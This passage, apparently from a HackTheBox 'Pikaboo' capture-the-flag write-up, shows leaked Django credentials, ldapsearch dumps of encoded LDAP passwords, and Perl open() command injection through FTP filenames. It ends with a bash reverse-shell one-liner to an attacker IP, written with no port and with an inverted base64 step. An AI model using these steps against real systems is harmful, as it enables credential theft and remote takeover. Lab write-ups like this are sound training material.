<span class="n">MIDDLEWARE</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">"corsheaders.middleware.CorsMiddleware"</span><span class="p">,</span>
    <span class="s">"django.middleware.common.CommonMiddleware"</span><span class="p">,</span>
    <span class="s">"django.contrib.sessions.middleware.SessionMiddleware"</span><span class="p">,</span>
    <span class="s">"django.middleware.csrf.CsrfViewMiddleware"</span><span class="p">,</span>
    <span class="s">"django.contrib.auth.middleware.AuthenticationMiddleware"</span><span class="p">,</span>
    <span class="s">"django.contrib.messages.middleware.MessageMiddleware"</span><span class="p">,</span>
    <span class="s">"django.middleware.clickjacking.XFrameOptionsMiddleware"</span><span class="p">,</span>
<span class="p">]</span>

<span class="n">ROOT_URLCONF</span> <span class="o">=</span> <span class="s">"config.urls"</span>

<span class="n">WSGI_APPLICATION</span> <span class="o">=</span> <span class="s">"config.wsgi.application"</span>

<span class="n">DATABASES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"ldap"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s">"ENGINE"</span><span class="p">:</span> <span class="s">"ldapdb.backends.ldap"</span><span class="p">,</span>
        <span class="s">"NAME"</span><span class="p">:</span> <span class="s">"ldap:///"</span><span class="p">,</span>
        <span class="s">"USER"</span><span class="p">:</span> <span class="s">"cn=binduser,ou=users,dc=pikaboo,dc=htb"</span><span class="p">,</span>
        <span class="s">"PASSWORD"</span><span class="p">:</span> <span class="s">"J~42%W?PFHl]g"</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="s">"default"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s">"ENGINE"</span><span class="p">:</span> <span class="s">"django.db.backends.sqlite3"</span><span class="p">,</span>
        <span class="s">"NAME"</span><span class="p">:</span> <span class="s">"/opt/pokeapi/db.sqlite3"</span><span class="p">,</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">CACHES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"default"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s">"BACKEND"</span><span class="p">:</span> <span class="s">"django_redis.cache.RedisCache"</span><span class="p">,</span>
        <span class="s">"LOCATION"</span><span class="p">:</span> <span class="s">"redis://127.0.0.1:6379/1"</span><span class="p">,</span>
        <span class="s">"OPTIONS"</span><span class="p">:</span> <span class="p">{</span>
            <span class="s">"CLIENT_CLASS"</span><span class="p">:</span> <span class="s">"django_redis.client.DefaultClient"</span><span class="p">,</span>
        <span class="p">},</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">get</span><span class="p">(</span>
    <span class="s">"SECRET_KEY"</span><span class="p">,</span> <span class="s">"ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&amp;2l#"</span>
<span class="p">)</span>

<span class="n">CUSTOM_APPS</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s">"tastypie"</span><span class="p">,</span>
    <span class="s">"pokemon_v2"</span><span class="p">,</span>
<span class="p">)</span>

<span class="n">INSTALLED_APPS</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s">"django.contrib.auth"</span><span class="p">,</span>
    <span class="s">"django.contrib.contenttypes"</span><span class="p">,</span>
    <span class="s">"django.contrib.sessions"</span><span class="p">,</span>
    <span class="s">"django.contrib.sites"</span><span class="p">,</span>
    <span class="s">"django.contrib.admin"</span><span class="p">,</span>
    <span class="s">"django.contrib.humanize"</span><span class="p">,</span>
    <span class="s">"corsheaders"</span><span class="p">,</span>
    <span class="s">"rest_framework"</span><span class="p">,</span>
    <span class="s">"cachalot"</span><span class="p">,</span>
<span class="p">)</span> <span class="o">+</span> <span class="n">CUSTOM_APPS</span>


<span class="n">API_LIMIT_PER_PAGE</span> <span class="o">=</span> <span class="mi">1</span>

<span class="n">TASTYPIE_DEFAULT_FORMATS</span> <span class="o">=</span> <span class="p">[</span><span class="s">"json"</span><span class="p">]</span>

<span class="n">CORS_ORIGIN_ALLOW_ALL</span> <span class="o">=</span> <span class="bp">True</span>

<span class="n">CORS_ALLOW_METHODS</span> <span class="o">=</span> <span class="s">"GET"</span>

<span class="n">CORS_URLS_REGEX</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"^/api/.*$"</span>

<span class="n">REST_FRAMEWORK</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"DEFAULT_RENDERER_CLASSES"</span><span class="p">:</span> <span class="p">(</span><span class="s">"drf_ujson.renderers.UJSONRenderer"</span><span class="p">,),</span>
    <span class="s">"DEFAULT_PARSER_CLASSES"</span><span class="p">:</span> <span class="p">(</span><span class="s">"drf_ujson.renderers.UJSONRenderer"</span><span class="p">,),</span>
    <span class="s">"DEFAULT_PAGINATION_CLASS"</span><span class="p">:</span> <span class="s">"rest_framework.pagination.LimitOffsetPagination"</span><span class="p">,</span>
    <span class="s">"PAGE_SIZE"</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span>
    <span class="s">"PAGINATE_BY"</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span>
<span class="p">}</span>

</pre></table></code></div></div><p>Also the machine has LDAP port open and serving on localhost only. On port 81 apache is running.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/17.png" alt="17" style="zoom: 50%;" /></p><p>I used the credentials from <code class="language-plaintext highlighter-rouge">settings.py</code> file using ldapsearch tool.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> localhost <span class="nt">-D</span> <span class="s2">"cn=binduser,ou=users,dc=pikaboo,dc=htb"</span> <span class="nt">-w</span> <span class="s2">"J~42%W?PFHl]g"</span> <span class="nt">-s</span> base namingContexts
<span class="c"># extended LDIF</span>
<span class="c">#</span>
....[snip]....
<span class="c"># requesting: namingContexts </span>
<span class="c">#</span>

<span class="c">#</span>
dn:
namingContexts: <span class="nv">dc</span><span class="o">=</span>htb

....[snip]....

<span class="c"># numResponses: 2</span>
<span class="c"># numEntries: 1</span>
</pre></table></code></div></div><p>This gave me DC which is Domain Component for the ldap. I will use this DC in <code class="language-plaintext highlighter-rouge">ldapsearch</code> query,</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> localhost <span class="nt">-D</span> <span class="s2">"cn=binduser,ou=users,dc=pikaboo,dc=htb"</span> <span class="nt">-w</span> <span class="s2">"J~42%W?PFHl]g"</span> <span class="nt">-b</span> <span class="s2">"DC=htb"</span>
<span class="c"># extended LDIF</span>
....[snip]....
<span class="c">#</span>

<span class="c"># htb</span>
dn: <span class="nv">dc</span><span class="o">=</span>htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: htb
dc: htb

<span class="c"># admin, htb</span>
dn: <span class="nv">cn</span><span class="o">=</span>admin,dc<span class="o">=</span>htb
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: <span class="nv">e1NTSEF9bWxhdFNUTzJDZjZ6QjdVL2VyOVBUamtBVE5yZnJiVnE</span><span class="o">=</span>

....[snip]....

<span class="c"># users, ftp.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">users</span>

<span class="c"># groups, ftp.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">groups</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">groups</span>

<span class="c"># pwnmeow, users, ftp.pikaboo.htb</span>
dn: <span class="nv">uid</span><span class="o">=</span>pwnmeow,ou<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: <span class="nv">X0cwdFQ0X0M0dGNIXyczbV80bEwhXw</span><span class="o">==</span>

<span class="c"># binduser, users, pikaboo.htb</span>
dn: <span class="nv">cn</span><span class="o">=</span>binduser,ou<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: <span class="nv">Sn40MiVXP1BGSGxdZw</span><span class="o">==</span>

....[snip]....

<span class="c"># numResponses: 15</span>
<span class="c"># numEntries: 14</span>
</pre></table></code></div></div><p>This query dumped a lot of useful information such as administrator password for LDAP, FTP password for pwnmeow. The password stored on the LDAP server is base64 encoded, its easy to decode it. I got the plain text password for pwnmeow user.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/19.png" alt="19" style="zoom: 67%;" /></p><p>I can now login using pwnmeow’s credentials on to FTP server.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/20.png" alt="20" style="zoom: 67%;" /></p><p>There are lots of file inside the FTP server.</p><h2 id="perl-vulnerabilty">Perl Vulnerabilty</h2><p>Per has a vulnerabilty where <code class="language-plaintext highlighter-rouge">open()</code> function behavious weirdly, if the file has <code class="language-plaintext highlighter-rouge">|</code> before the filename then whatever is after the pipe gets executed and if the <code class="language-plaintext highlighter-rouge">|</code> is after the filename then output is thrown at the STDOUT.</p><p>I have to first create files like <code class="language-plaintext highlighter-rouge">amroot.csv</code> and <code class="language-plaintext highlighter-rouge">amroot.txt</code> else it doesn’t work. I will then upload these files to any random directory. I chose <code class="language-plaintext highlighter-rouge">versions</code> here.</p><p>To see if this works I will ping to my machine and as you can see I got successful ping from <code class="language-plaintext highlighter-rouge">10.10.10.249</code>.</p><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/21.png" alt="21" style="zoom: 50%;" /></p><p>I will now try to get reverse shell.</p><p>Using normal bash oneliner wasn’t working as it was colliding. So I had to base64 the command and execute that way.</p><ol><li>Base64 the bash one-liner command <code class="language-plaintext highlighter-rouge">echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5 0&gt;&amp;1'; " | base64 -d </code><li>Enter the output from the above command into FTP’s terminal as <code class="language-plaintext highlighter-rouge">put</code>’s argument as you can see <strong>1</strong> in below image<li>Make sure to start listener as mentioned in <strong>2</strong> step of the image</ol><p><img data-proofer-ignore data-src="/image/hackthebox/pikaboo/22.png" alt="22" style="zoom: 50%;" /></p><p>It was a long journey and fun box.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/http/" class="post-tag no-text-decoration" >http</a> <a href="/tags/ldap/" class="post-tag no-text-decoration" >ldap</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/blackhat/" class="post-tag no-text-decoration" >blackhat</a> <a href="/tags/orangetsai/" class="post-tag no-text-decoration" >orangetsai</a> <a href="/tags/parser/" class="post-tag no-text-decoration" >parser</a> <a href="/tags/nginx/" class="post-tag no-text-decoration" >nginx</a> <a href="/tags/apache/" class="post-tag no-text-decoration" >apache</a> <a href="/tags/log/" class="post-tag no-text-decoration" >log</a> <a href="/tags/logpoisoning/" class="post-tag no-text-decoration" >logpoisoning</a> <a href="/tags/poison/" class="post-tag no-text-decoration" >poison</a> <a href="/tags/commandinjection/" class="post-tag no-text-decoration" >commandinjection</a> <a href="/tags/cmdinjection/" class="post-tag no-text-decoration" >cmdinjection</a> <a href="/tags/reverseproxy/" class="post-tag no-text-decoration" >reverseproxy</a> <a href="/tags/proxy/" class="post-tag no-text-decoration" >proxy</a> <a href="/tags/offbyslash/" class="post-tag no-text-decoration" >offbyslash</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/open-basedir/" class="post-tag no-text-decoration" >open_basedir</a> <a href="/tags/crontab/" class="post-tag no-text-decoration" >crontab</a> <a href="/tags/cron/" class="post-tag no-text-decoration" >cron</a> <a href="/tags/csv/" class="post-tag no-text-decoration" >csv</a> <a href="/tags/perl/" class="post-tag no-text-decoration" >perl</a> <a href="/tags/ldapsearch/" class="post-tag no-text-decoration" >ldapsearch</a> <a href="/tags/open/" class="post-tag no-text-decoration" >open</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox Pikaboo - amroot&url=https://am-root.github.io/posts/HTB-Pikaboo/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox Pikaboo - amroot&u=https://am-root.github.io/posts/HTB-Pikaboo/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://am-root.github.io/posts/HTB-Pikaboo/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Nunchucks/">HackTheBox Nunchucks</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/443/">443</a> <a class="post-tag" href="/tags/apache/">apache</a> <a class="post-tag" href="/tags/blackhat/">blackhat</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/capability/">capability</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Seal/"><div class="card-body"> <span class="timeago small" >Nov 20, 2021<i class="unloaded">2021-11-20T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Seal</h3><div class="text-muted small"><p> Machine information Seal is very entertaining machine. First discovering Vhost of the machine and running ffuf against it showed few directories that were used in Apache Tomcat server. Another Ser...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Monitors/"><div class="card-body"> <span class="timeago small" >Oct 31, 2021<i class="unloaded">2021-10-31T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Monitors</h3><div class="text-muted small"><p> Machine Information Monitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after som...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Nunchucks/"><div class="card-body"> <span class="timeago small" >Nov 9, 2021<i class="unloaded">2021-11-09T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Nunchucks</h3><div class="text-muted small"><p> Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerabil...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Seal/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox Seal</p></a> <a href="/posts/HTB-Forge/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox Forge</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/_amroot">Janak Khairmode</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/443/">443</a> <a class="post-tag" href="/tags/apache/">apache</a> <a class="post-tag" href="/tags/blackhat/">blackhat</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/capability/">capability</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
